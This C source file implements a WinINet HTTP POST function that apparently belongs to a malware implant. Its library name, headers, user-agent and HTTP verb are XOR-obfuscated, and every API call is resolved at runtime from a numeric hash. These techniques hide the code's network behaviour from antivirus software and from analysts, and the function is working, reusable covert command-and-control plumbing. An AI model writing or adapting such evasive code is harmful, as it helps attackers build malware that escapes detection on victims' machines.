#include "http/http.h"

char *makeHttpPostRequest(const char *host, int port, const char *endpoint, const char *postData)
{
	HINTERNET hInternet, hConnect, hRequest;
	DWORD dwBytesRead;
	BOOL bResults;
	const char *szHeaders = fheXOR("250a1a170d081159371116004e43091615180a0b07111d0c06491d59141f1148120c1a0b48011104030b170c0c0301", fXOR("56'0;", 'S'));
	char szBuffer[BUFFER_SIZE];
	char *response = NULL;
	LPCSTR lpLibFileName = TEXT(fheXOR("110c1a0a0603115a07040a", fXOR("56'0;", 'S')));

	m_internetOpenPtr internetOpen = (m_internetOpenPtr)m_GetProcAddressEx(lpLibFileName, -144894463);
	hInternet = internetOpen(fheXOR("2b0a0e0a040a045b564656455c2e09050c1a1707150d4f43210811110f482b0417432735452c4359563a455637514c542218160911340d042e1d17475356434d5b50455c28203228384f480a0c1f064821001708074f45370b1a0908114c5954575a5346564b44433b070315110149504754465553", fXOR("56'0;", 'S')), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInternet)
	{
		// printf("Error initializing WinINet.\n");
		return NULL;
	}

	m_internetConnectPtr internetConnect = (m_internetConnectPtr)m_GetProcAddressEx(lpLibFileName, -135651295);
	hConnect = internetConnect(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	m_internetCloseHandlePtr internetCloseHandle = (m_internetCloseHandlePtr)m_GetProcAddressEx(lpLibFileName, 736583232);
	if (!hConnect)
	{
		// printf("Error connecting to the server.\n");
		internetCloseHandle(hInternet);
		return NULL;
	}

	m_httpOpenRequestPtr httpOpenRequest = (m_httpOpenRequestPtr)m_GetProcAddressEx(lpLibFileName, -811291780);
	hRequest = httpOpenRequest(hConnect, fheXOR("362a2737", fXOR("56'0;", 'S')), endpoint, NULL, NULL, NULL, 0, 0);
	if (!hRequest)
	{
		// printf("Error opening the request.\n");
		internetCloseHandle(hConnect);
		internetCloseHandle(hInternet);
		return NULL;
	}

	m_httpSendRequestPtr httpSendRequest = (m_httpSendRequestPtr)m_GetProcAddressEx(lpLibFileName, -261124462);
	bResults = httpSendRequest(hRequest, szHeaders, strlen(szHeaders), (LPVOID)postData, strlen(postData));
	if (!bResults)
	{
		// printf("Error sending the request.\n");
		internetCloseHandle(hRequest);
		internetCloseHandle(hConnect);
		internetCloseHandle(hInternet);
		return NULL;
	}

	response = (char *)malloc(BUFFER_SIZE); // Allocate initial memory
	response[0] = '\0';						// Initialize as empty string

	m_internetReadFilePtr internetReadFile = (m_internetReadFilePtr)m_GetProcAddressEx(lpLibFileName, 981983357);
	while (internetReadFile(hRequest, szBuffer, BUFFER_SIZE - 1, &dwBytesRead) && dwBytesRead != 0)
	{
		szBuffer[dwBytesRead] = '\0';
		response = (char *)realloc(response, strlen(response) + dwBytesRead + 1); // Resize memory
		strcat(response, szBuffer);												  // Append new data to response
	}

	// Close handles
	internetCloseHandle(hRequest);
	internetCloseHandle(hConnect);
	internetCloseHandle(hInternet);

	return response;
}